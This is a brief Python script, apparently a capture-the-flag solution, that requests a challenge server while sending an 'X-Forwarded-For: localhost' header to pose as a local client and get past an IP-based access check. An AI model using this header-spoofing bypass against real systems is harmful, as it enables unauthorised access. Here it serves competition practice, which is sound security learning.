import requests as s

headers={
    "Priority": "u=0, i",
    "X-Forwarded-For": "localhost",
}



req = s.get("http://chal.competitivecyber.club:8081/", headers=headers)


print(req.text)
